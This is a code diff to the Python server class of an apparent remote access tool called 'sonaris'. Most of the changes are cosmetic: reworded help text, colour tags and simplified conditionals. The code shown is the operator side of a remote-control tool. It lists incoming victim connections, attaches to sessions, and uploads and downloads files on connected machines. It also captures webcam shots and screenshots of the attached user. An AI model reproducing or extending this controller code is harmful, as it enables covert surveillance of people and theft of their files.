@@ -37,22 +37,24 @@ class Server(object):
             hour, minute, second = self.calculateElapsedTime(time()-userInfo["initialTime"]) # elapsed session time
             data = [
                 f'Name Session: [green]{self.userAttached}',
-                f'[white]Current Directory: [green]"{userInfo["currentDirectory"]}',
+                f'[white]Current Directory: [green]"{userInfo["currentDirectory"]}"',
                 f'[white]Elapsed session Time: [green]{hour}:{minute}:{int(second)} [white]seconds'
             ]
 
             for info in data:
                 printr(info)
         else:
-            printr(f'[red] No session currently attached.')
+            printr(f'Info: Shows basic information of the session you are linked')
 
     # basic information from attached user
     def userInfo(self, args):
         if self.userAttached:
             user = self.getCurrentUser()
-            printr(''.join(f'{key}: {value}\n' for key, value in user.items() if key not in ['conn', 'currentDirectory', 'initialTime']))
+            for key, value in user.items():
+                if key not in ['conn', 'currentDirectory', 'initialTime']:
+                    printr(f'[white]{key}: [green]{value}')
         else:
-            printr(f'[red] No session currently attached.')
+            printr(f'Info: Shows basic information of the user you are linked')
 
     # attaches to an active session
     def attach(self, name):
@@ -60,7 +62,7 @@ class Server(object):
             if self.connectedUsers.get(name):
                 self.userAttached = name
                 self.userCwd = self.getCurrentUser()['currentDirectory']
-                printr(f'[green] You are attached to a section with {name} now!')
+                printr(f'[green] You are attached to a section with [yellow]{name}[green] now!')
             else:
                 printr(f'[red] There is no open session with [yellow]{name}.')
         else:
@@ -71,7 +73,7 @@ class Server(object):
         if self.userAttached:
             self.userAttached = self.userCwd = ''
         else:
-            printr(f'[red] No session currently attached.')
+            printr(f'Info: Detach from the current session (when you are in one)')
 
     # checking if folders for screenshot or downloaded files exists
     def checkFolders(self):
@@ -111,55 +113,49 @@ class Server(object):
     
     # uploading a local file (server side) to client side
     def upload(self, args):
-        if self.userAttached:
-            if args:
-                try:
-                    if Path(args).is_file():
-                        connection = self.getCurrentUser()['conn']
-                        connection.send(self.lastCommand.encode())
-                        
-                        namefile, extension, file = self.splitFile(args)
-                        self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
-                        sleep(1)
-                        connection.send(file)
+        if args and self.userAttached:
+            try:
+                if Path(args).is_file():
+                    connection = self.getCurrentUser()['conn']
+                    connection.send(self.lastCommand.encode())
+                    
+                    namefile, extension, file = self.splitFile(args)
+                    self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
+                    sleep(1)
+                    connection.send(file)
 
-                        response = loads(connection.recv(512))
-                        if response['sucess']:
-                            printr(f"[green]{response['content']}")
-                        else:
-                            printr(f"[red]{response['content']}")
+                    response = loads(connection.recv(512))
+                    if response['sucess']:
+                        printr(f"[green]{response['content']}")
                     else:
-                        printr(f'[red] File {args} not found.')
+                        printr(f"[red]{response['content']}")
+                else:
+                    printr(f'[red] File {args} not found.')
 
-                except PermissionError:
-                    printr(f'[red] Permission denied: {args}')
-            else:
-                printr('Info: Upload a file to client. [green]Ex: /upload nothing.pdf')
+            except PermissionError:
+                printr(f'[red] Permission denied: {args}')
         else:
-            printr('[yellow] No session currently attached.')
+            printr('Info: Upload a file to client. [green]Ex: /upload nothing.pdf')
 
     # downloading a file from client side
     def download(self, args):
         self.checkFolders()
 
-        if self.userAttached:
-            if args:
-                connection = self.getCurrentUser()['conn']
-                connection.send(self.lastCommand.encode())
-                try:
-                    header = loads(connection.recv(512))
-                    if header["sucess"]:
-                        self.receiveFile(connection, header)
-                    else:
-                        printr(f'[red]{header["content"]}')
+        if args and self.userAttached:
+            connection = self.getCurrentUser()['conn']
+            connection.send(self.lastCommand.encode())
+            try:
+                header = loads(connection.recv(512))
+                if header["sucess"]:
+                    self.receiveFile(connection, header)
+                else:
+                    printr(f'[red]{header["content"]}')
 
-                except EOFError:
-                    printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
-                    self.removecurrentSession() # removing the current session because connection probaly was lost
-            else:
-                printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr('[yellow] No session currently attached.')
+            printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
 
     # taking a webcam shot from client side
     def webcamshot(self, args):
@@ -187,7 +183,7 @@ class Server(object):
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr('[yellow] No session currently attached.')
+            printr('Info: Takes a webcamshot of the user you are attached')
 
     # taking a screenshot from client side
     def screenshot(self, args):
@@ -203,7 +199,7 @@ class Server(object):
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr('[yellow] No session currently attached.')
+            printr('Info: Takes a screenshot of the user you are attached')
 
     # calculating time response of some command  | param: seconds of the period
     def calculateElapsedTime(self, seconds):
@@ -237,7 +233,7 @@ class Server(object):
             else:
                 printr(f'[red] There is no open session with [yellow]{name}.')
         else:
-            print('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')
+            printr('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')
     
     # cleaning the screen (obviously) 
     def clearScreen(self, args=''):
@@ -270,10 +266,6 @@ class Server(object):
     def availableCommands(self, args):
         printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))
 
-    # showing the last used command 
-    def showLastCommand(self, args):
-        printr(self.lastCommand)
-
     # showing only the internal commands
     def internalcommands(self, args):
         printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
@@ -294,7 +286,6 @@ class Server(object):
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
-            "/lastcommand": {"local": True, "action": self.showLastCommand},
             "/internalcommands": {"local": True, "action": self.internalcommands}
         }
 
@@ -382,7 +373,7 @@ class Server(object):
             response = loads(connection.recv(1024))
             response.update({"conn": connection, "initialTime": time()})
             self.addUser(response)
-            printr(f'\n[*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
+            printr(f'\n[yellow][*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
             printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]#:{self.userCwd}# ', end='')
 
     # configuring the socket object
